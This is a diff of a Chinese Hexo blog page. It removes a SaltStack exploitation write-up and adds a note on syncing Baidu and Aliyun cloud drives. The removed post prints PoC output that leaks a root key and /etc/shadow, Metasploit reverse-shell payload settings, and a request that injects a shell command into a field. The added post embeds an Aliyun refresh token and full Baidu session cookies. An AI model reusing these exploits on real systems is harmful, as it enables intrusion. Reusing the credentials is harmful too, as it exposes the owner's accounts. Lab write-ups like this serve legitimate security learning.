@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>SaltStack | Mr.Frame</title>
+  <title>关于同步盘的一些方案 | Mr.Frame</title>
   <meta name="keywords" content="">
-  <meta name="description" content="SaltStack | Mr.Frame">
+  <meta name="description" content="关于同步盘的一些方案 | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在!!!">
 <meta property="og:type" content="website">
@@ -935,9 +935,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-SaltStack" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-关于同步盘的一些方案" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">SaltStack</h1>
+        <h1 class="article-title">关于同步盘的一些方案</h1>
     
     <div class="article-meta">
         
@@ -947,9 +947,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Tools">Tools</a>
             
         </span>
         
@@ -957,12 +955,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-04 20:23:00'>2020-12-04 20:23</time>
+            Created At : <time class="date" title='Updated At: 2022-02-01 18:12:37'>2022-02-01 18:12</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.1k</span>
+        <span>Count:282</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -992,7 +990,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SaltStack%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11651"><span class="toc-text">SaltStack水平权限绕过漏洞 CVE-2020-11651</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11651-poc%E9%AA%8C%E8%AF%81"><span class="toc-text">CVE-2020-11651-poc验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">MSF漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SaltStack%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2020-11652"><span class="toc-text">SaltStack任意文件读取 CVE-2020-11652</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-11651-poc%E5%B7%A5%E5%85%B7%E9%AA%8C%E8%AF%81"><span class="toc-text">CVE-2020-11651-poc工具验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SaltStack%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2020-16846"><span class="toc-text">SaltStack命令注入漏洞 CVE-2020-16846</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BurpSuite%E5%A4%8D%E6%B5%8B"><span class="toc-text">BurpSuite复测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%A4%8D%E6%B5%8B"><span class="toc-text">MSF复测</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8C%E6%AD%A5sync"><span class="toc-text">同步sync</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6%E4%BA%91-%E2%80%94-gt-%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98"><span class="toc-text">百度云 —&gt; 阿里云盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8yaronzz-BaiduYunToAliYun-%E5%8D%B3%E5%8F%AF%E5%AE%9E%E7%8E%B0"><span class="toc-text">利用yaronzz&#x2F;BaiduYunToAliYun 即可实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b2a%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AE%A4%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-text">b2a配置文件认证信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98%E2%80%93-gt-Webdav"><span class="toc-text">阿里云盘–&gt;Webdav</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98WebDAV%E5%85%B1%E4%BA%AB%EF%BC%8C%E6%94%AF%E6%8C%81%E6%9C%AC%E5%9C%B0%E6%8C%82%E8%BD%BD%E3%80%81%E5%90%8C%E6%AD%A5-sleele%E7%9A%84%E5%8D%9A%E5%AE%A2"><span class="toc-text">阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98-%E2%80%93-gt-%E6%9C%AC%E5%9C%B0%E7%A1%AC%E7%9B%98"><span class="toc-text">阿里云盘 –&gt; 本地硬盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CloudDrive-%E2%80%94-%E5%B0%86%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98%E5%8F%98%E6%88%90%E7%94%B5%E8%84%91%E6%9C%AC%E5%9C%B0%E7%A3%81%E7%9B%98%EF%BC%8C%E7%BD%91%E7%9B%98%E6%8C%82%E8%BD%BD%E6%98%A0%E5%B0%84%E4%B8%BA%E6%9C%AC%E5%9C%B0%E7%A3%81%E7%9B%98%EF%BC%81-%E9%A9%AC%E5%B0%8F%E5%B8%AE-maxiaobang-com"><span class="toc-text">CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98%E2%80%93-gt-%E5%90%8C%E6%AD%A5%E7%9B%98"><span class="toc-text">阿里云盘–&gt; 同步盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8Dbug-%C2%B7-yxhpy-%E5%90%8C%E6%AD%A5%E9%98%BF%E9%87%8C%E7%9B%98-Gitee-com"><span class="toc-text">修复bug · yxhpy&#x2F;同步阿里盘 - Gitee.com</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1008,121 +1006,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>SaltStack 是基于 Python 开发的一套C/S架构配置管理工具,是一个服务器基础架构集中化管理平台，具备配置管理，远程执行，监控等功能。</p>
+        <p>编写进度</p>
 <ul>
-<li><code>4505/4506</code> SaltStack Master与minions通信的端口</li>
-<li><code>8000</code> 这是Salt的API端口,需要通过https访问</li>
+<li><input checked="" disabled="" type="checkbox"> </li>
 </ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code> nmap -Pn -T4  -sV -p 4505,4506,8000 192.168.79.28
-Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 12:30 CST
-Nmap scan report for 192.168.79.28
-Host is up (0.00021s latency).
-
-PORT     STATE SERVICE  VERSION
-4505/tcp open  zmtp     ZeroMQ ZMTP 2.0
-4506/tcp open  zmtp     ZeroMQ ZMTP 2.0
-8000/tcp open  ssl/http CherryPy wsgiserver
-</code></pre>
-<h2 id="SaltStack水平权限绕过漏洞-CVE-2020-11651"><a href="#SaltStack水平权限绕过漏洞-CVE-2020-11651" class="headerlink" title="SaltStack水平权限绕过漏洞 CVE-2020-11651"></a>SaltStack水平权限绕过漏洞 CVE-2020-11651</h2><hr>
-<p>在 CVE-2020-11651 认证绕过漏洞中，<br>      攻击者通过构造恶意请求，<br>                 可以绕过 Salt Master 的验证逻辑，<br>                  调用相关未授权函数功能，<br>从而可以造成远程命令执行漏洞。</p>
-<p>影响版本：</p>
-<ul>
-<li>SaltStack &lt; 2019.2.4</li>
-<li>SaltStack &lt; 3000.2</li>
-</ul>
-<h3 id="CVE-2020-11651-poc验证"><a href="#CVE-2020-11651-poc验证" class="headerlink" title="CVE-2020-11651-poc验证"></a><a target="_blank" rel="noopener" href="https://github.com/askDing/CVE-2020-11651-poc">CVE-2020-11651-poc</a>验证</h3><pre><code>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130
-[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
-[+] Salt version: 3000.1
-[ ] This version of salt is vulnerable! Check results below
-[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
-[+] Checking if vulnerable to CVE-2020-11651...
-[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
-root@kalimah:~/salt#</code></pre>
-<h3 id="MSF漏洞利用"><a href="#MSF漏洞利用" class="headerlink" title="MSF漏洞利用"></a>MSF漏洞利用</h3><pre><code>Module options (exploit/linux/misc/saltstack_salt_unauth_rce):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   MINIONS   .*               yes       PCRE regex of minions to target
-   RHOSTS    10.190.26.13     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   ROOT_KEY                   no        Master&#39;s root key if you have it
-   RPORT     4506             yes       The target port (TCP)
-   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT   8080             yes       The local port to listen on.
-   SSL       false            no        Negotiate SSL for incoming connections
-   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
-   URIPATH                    no        The URI to use for this exploit (default is random)
-
-
-Payload options (python/meterpreter/reverse_https):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.79.28    yes       The local listener hostname
-   LPORT  8443             yes       The local listener port
-   LURI                    no        The HTTP Path</code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
-<li>SaltStack官方已发布最新版本修复了上述漏洞，建议相关用户及时更新规避风险。<a target="_blank" rel="noopener" href="https://github.com/saltstack/salt/releases">https://github.com/saltstack/salt/releases</a></li>
-<li>禁止将Salt Master默认监听端口（4505、4506）向公网开放，并设置为仅对可信对象开放。</li>
-</ul>
-<p>[参考]<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651">SaltStack认证绕过漏洞</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k2ClnCQdBi0FoId7hrRQNw">SaltStack认证绕过</a></p>
-<h2 id="SaltStack任意文件读取-CVE-2020-11652"><a href="#SaltStack任意文件读取-CVE-2020-11652" class="headerlink" title="SaltStack任意文件读取 CVE-2020-11652"></a>SaltStack任意文件读取 CVE-2020-11652</h2><p>攻击者可构造恶意请求，读取，写入服务器上任意文件</p>
-<h3 id="CVE-2020-11651-poc工具验证"><a href="#CVE-2020-11651-poc工具验证" class="headerlink" title="CVE-2020-11651-poc工具验证"></a><a target="_blank" rel="noopener" href="https://github.com/askDing/CVE-2020-11651-poc">CVE-2020-11651-poc</a>工具验证</h3><p><a target="_blank" rel="noopener" href="https://github.com/askDing/salt-security-backports.git">salt-securiy-backports</a><br>也可验证</p>
-<pre><code>root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow
-[+] Salt version: 2019.2.0
-[ ] This version of salt is vulnerable! Check results below
-[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
-[+] Checking if vulnerable to CVE-2020-11651...
-[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
-[+] Attemping to read /etc/shadow from 192.168.115.130
-root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::
-daemon:*:17785:0:99999:7:::
-bin:*:17785:0:99999:7:::
-sys:*:17785:0:99999:7:::
-sync:*:17785:0:99999:7:::
-games:*:17785:0:99999:7:::
-man:*:17785:0:99999:7:::
-[...]</code></pre>
-<h2 id="SaltStack命令注入漏洞-CVE-2020-16846"><a href="#SaltStack命令注入漏洞-CVE-2020-16846" class="headerlink" title="SaltStack命令注入漏洞 CVE-2020-16846"></a>SaltStack命令注入漏洞 CVE-2020-16846</h2><p>2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，<br>其中CVE-2020-25592允许任意用户调用SSH模块，<br>CVE-2020-16846允许用户执行任意命令。<br>组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。</p>
-<h3 id="BurpSuite复测"><a href="#BurpSuite复测" class="headerlink" title="BurpSuite复测"></a>BurpSuite复测</h3><pre><code>POST /run HTTP/1.1
-Host: 127.0.0.1:8000
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: application/x-yaml
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 87
-
-token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%20/tmp/success%3b
-</code></pre>
-<p><img src="../images/saltstack-1.png" alt="saltstack-1"></p>
-<h3 id="MSF复测"><a href="#MSF复测" class="headerlink" title="MSF复测"></a>MSF复测</h3><pre><code>
-Module options (exploit/linux/http/saltstack_salt_api_cmd_exec):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.190.75.23     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT      8000             yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        true             no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       Base path
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
-
-
-Payload options (cmd/unix/reverse_python_ssl):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port</code></pre>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
+<h1 id="同步sync"><a href="#同步sync" class="headerlink" title="同步sync"></a>同步sync</h1><h2 id="百度云-—-gt-阿里云盘"><a href="#百度云-—-gt-阿里云盘" class="headerlink" title="百度云 —&gt; 阿里云盘"></a>百度云 —&gt; 阿里云盘</h2><h3 id="利用yaronzz-BaiduYunToAliYun-即可实现"><a href="#利用yaronzz-BaiduYunToAliYun-即可实现" class="headerlink" title="利用yaronzz/BaiduYunToAliYun 即可实现"></a>利用<a target="_blank" rel="noopener" href="https://github.com/yaronzz/BaiduYunToAliYun">yaronzz/BaiduYunToAliYun</a> 即可实现</h3><p> <code>token/cookie</code>获取</p>
+<ol>
+<li>阿里云<code>refresh_token</code>获取<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220416095719.png"></li>
+<li>百度盘<code>cookie</code>获取<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220416100301.png"></li>
+</ol>
+<pre><code class="shell">pip3 install b2a --upgrade
+b2a -a &quot;&lt;ali_refresh_token&gt;&quot;
+b2a -b &quot;baidu_cookies&quot; 
+b2a -f &quot;/&quot;  -t &quot;/BaiDu&quot;</code></pre>
+<h3 id="b2a配置文件认证信息"><a href="#b2a配置文件认证信息" class="headerlink" title="b2a配置文件认证信息"></a>b2a配置文件认证信息</h3><pre><code class="shell">cat &lt;&lt;EOF &gt; ~/b2a/auth.json
+&#123;&quot;ali-refresh_token&quot;: &quot;ae253a9107ea420ebfac4eb768142bb5&quot;, &quot;bdy-cookies&quot;: &quot;BIDUPSID=1689F7B461CC0E9C52F12B6BFB6A338F; PSTM=1647073439; PANWEB=1; BAIDUID=1689F7B461CC0E9C52F12B6BFB6A338F:SL=0:NR=10:FG=1; secu=1; BDUSS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; BDUSS_BFESS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; STOKEN=7827cfa835e2d55a9c7a5be98df1e12e685f836295666013c2802f7b3983fa05; SCRC=7a20d4e131f1f62f59df7bf2a44a54c9; RT=\&quot;z=1&amp;dm=baidu.com&amp;si=tt4cn8zgmy&amp;ss=l1z3c1fp&amp;sl=4&amp;tt=3lm&amp;bcn=https://fclog.baidu.com/log/weirwood?type=perf&amp;ld=6vo&amp;cl=dfu&amp;ul=kf5&amp;hd=kfi\&quot;; BAIDUID_BFESS=3B52D998848FA0E8B156B63A5126C170:FG=1; csrfToken=gKO-SRJWqAlt7XT9eLasiYy1; BDCLND=NEJdXEDrxfGN7ZPEfNIpeVClSbQ8ESNP; H_PS_PSSID=36175_31660_34812_36167_34584_36122_36277_36125_35864_36226_26350_35724_36102_36061; ndut_fmt=8B0D77DBC872794E85285409CEFEA0CD13623C1299B9CDA79916989D73569A6C; ab_sr=1.0.1_OTFkMTM5NjAxYTY0ZTRiY2M3M2NkODFlMDY0ZjM0YWEyZDIxMDE1MzVmNGUxNmQ0ZGZiZWM5NTk5OWYxZDZmOTU0NjAxNzQxNzczOTJjY2IxYWJhNDE1M2FkYzE0MWJlZjVjOWU3Y2FkMjAzYzU3ZDE1M2Y2Y2NjM2RmY2IzY2Y2OGU4MTYzYjdkNzlhOTFiZGFhZDE0YjEzZjk2ZWUyYQ==; PANPSC=17250608177919035327:CU2JWesajwB3OVK+W4jA5KPTzGELv+1dq7qxW58SMTAwV13IojYjLUci2O0YbEjp7R2km3p1TIG4lUanlzCLQaKK/FH5WUxXYwBzCbaY2H6Ac/axOKu0XZNBoZ8i0CTW8pfgMw2m/oeGDMyMjs7itnzWX47O8AWwA7Z48hYGgW3ajUyYmLmFn1t8VXlRfZV&quot;, &quot;dl-path&quot;: null&#125; </code></pre>
+<h2 id="阿里云盘–-gt-Webdav"><a href="#阿里云盘–-gt-Webdav" class="headerlink" title="阿里云盘–&gt;Webdav"></a>阿里云盘–&gt;Webdav</h2><h3 id="阿里云盘WebDAV共享，支持本地挂载、同步-sleele的博客"><a href="#阿里云盘WebDAV共享，支持本地挂载、同步-sleele的博客" class="headerlink" title="阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客"></a><a target="_blank" rel="noopener" href="https://sleele.com/2021/08/03/webdav-aliyundriver/">阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客</a></h3><h2 id="阿里云盘-–-gt-本地硬盘"><a href="#阿里云盘-–-gt-本地硬盘" class="headerlink" title="阿里云盘 –&gt; 本地硬盘"></a>阿里云盘 –&gt; 本地硬盘</h2><h3 id="CloudDrive-—-将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！-马小帮-maxiaobang-com"><a href="#CloudDrive-—-将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！-马小帮-maxiaobang-com" class="headerlink" title="CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)"></a><a target="_blank" rel="noopener" href="https://www.maxiaobang.com/10786.html">CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)</a></h3><p><a target="_blank" rel="noopener" href="https://github.com/spinnaker/clouddriver">spinnaker/clouddriver: read and write operations across cloud providers</a></p>
+<h2 id="阿里云盘–-gt-同步盘"><a href="#阿里云盘–-gt-同步盘" class="headerlink" title="阿里云盘–&gt; 同步盘"></a>阿里云盘–&gt; 同步盘</h2><h3 id="修复bug-·-yxhpy-同步阿里盘-Gitee-com"><a href="#修复bug-·-yxhpy-同步阿里盘-Gitee-com" class="headerlink" title="修复bug · yxhpy/同步阿里盘 - Gitee.com"></a><a target="_blank" rel="noopener" href="https://gitee.com/yxhpy/sync-alidisk/releases/v1.1.1">修复bug · yxhpy/同步阿里盘 - Gitee.com</a></h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
     </div>
